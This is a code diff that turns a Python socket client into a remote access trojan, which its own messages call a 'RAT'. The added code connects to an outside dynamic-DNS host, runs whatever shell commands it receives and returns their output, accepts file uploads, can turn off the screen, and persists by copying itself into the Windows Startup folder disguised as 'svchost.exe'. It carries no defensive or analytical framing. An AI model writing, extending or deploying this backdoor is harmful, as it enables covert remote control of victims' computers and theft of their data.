@@ -1,49 +1,94 @@
 import socket
 import os
 import time
+import sys
 
-def recvfile():
-    i = 1
-    f = open(sock.recv(1024), 'wb')  # Open in binary
-    i = i + 1
-    while True:
-        # Recibimos y escribimos en el fichero
-        l = sock.recv(1024)
-        while (l):
-            f.write(l)
-            l = sock.recv(1024)
- 
-def main():
-            while True:
-                try:
-                    print("1")
-                    data = sock.recv(1024).decode()  # получаем команду
-                    if data == "uploadfile":
-                        print("osvk")
-                        break
-                    else:
-                        continue
-                    aa = os.popen(data)
-                    result = aa.read()
-                    if len(result) == 0:
-                        sock.send(" ".encode())  # в случае, если рзультат
-                        # пустой, отправляем пробел
-                    else:
-                        sock.send(result.encode())  # отправляем результат
-                except:
-                    break
- 
-            
 while True:
-	try:
-	    print("trying...")
-	    sock.connect(("0.0.0.0", 1440))
-	except:
-		print("excepted")
-		sock = socket.socket()
-		time.sleep(10)
-		continue
-	else:
-		print("connected")
-		main()
-		break
+    try:
+        sock = socket.socket()
+        sock.connect(("remote8243.ddns.net", 9696))
+        while True:
+            try:
+                comm = sock.recv(1024).decode()
+                res_bytes = os.popen(comm)
+                result = res_bytes.read()
+                if comm == 'downcli':
+                    exit()
+                elif comm == 'screenoff':
+                    if sys.platform.startswith('linux'):
+                        os.system("xset dpms force off")
+
+                    elif sys.platform.startswith('win'):
+                        import win32gui
+                        import win32con
+                        from os import getpid, system
+                        from threading import Timer
+
+
+                        def force_exit():
+                            pid = getpid()
+                            system('taskkill /pid %s /f' % pid)
+                        t = Timer(1, force_exit)
+                        t.start()
+                        SC_MONITORPOWER = 0xF170
+                        win32gui.SendMessage(win32con.HWND_BROADCAST, win32con.WM_SYSCOMMAND, SC_MONITORPOWER, 2)
+                        t.cancel()
+                    sock.send("Screen offed...".encode())
+                elif comm[:2] == "cd":
+                    try:
+                        # Send command arguments to os.chdir / Отправка аргументов команды в os.chdir
+                        os.chdir(comm[3:])
+                        pwd = os.getcwd()
+                        sock.send(bytes(pwd, encoding="utf-8", errors="ignore"))
+                    except Exception as ex:
+                        sock.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))
+
+                # PWD
+
+                elif comm == "pwd":
+                    try:
+                        # Variable with current directory / Переменная с текущей директорией
+                        pwd = os.getcwd()
+                        sock.send(bytes(pwd, encoding="utf-8", errors="ignore"))
+                    except Exception as ex:
+                        sock.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))
+                elif comm == 'uploadfile':
+                    filename = socket.recv(1024)
+                    # fname = open('./asd.pdf', 'wb')
+                    fname = open('./' + filename, 'wb')
+                    while True:
+                        strng = socket.recv(1024)
+                        if strng:
+                            fname.write(strng)
+                        else:
+                            fname.close()
+                            break
+                elif comm == 'autorun':
+                        # Name of the compiled file / Имя скомпилированного файла
+                        filename = "svcnost.exe"
+                        # Windows username/ Имя пользователя Windows
+                        username = os.getlogin()
+                        # Path to startup folder / Путь к папке
+                        # с автозагрузкой
+                        startup = (r'C:/Users/' + username + r'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')
+
+                        # Check if file already exist / Проверка существует ли файл
+                        if os.path.exists(str(startup + r'svchost.exe')) == True:
+                            # Sending message / Отправляем сообщение
+                            sock.send(bytes("\nRAT already at startup folder\n", encoding="utf-8", errors="ignore"))
+                        else:
+                            os.system("copy " + filename + " " + '"' + startup + '"' + r'svchost.exe')
+                            # Sending message / Отправляем сообщение
+                            sock.send(bytes("\nRAT added at startup folder\n", encoding="utf-8", errors="ignore"))
+                else:
+                    if len(result) == 0:
+                        sock.send("No result or error".encode())
+                        continue
+                    else:
+                        sock.send(result.encode())
+                        continue
+            except:
+                break
+    except:
+        time.sleep(5)
+        continue
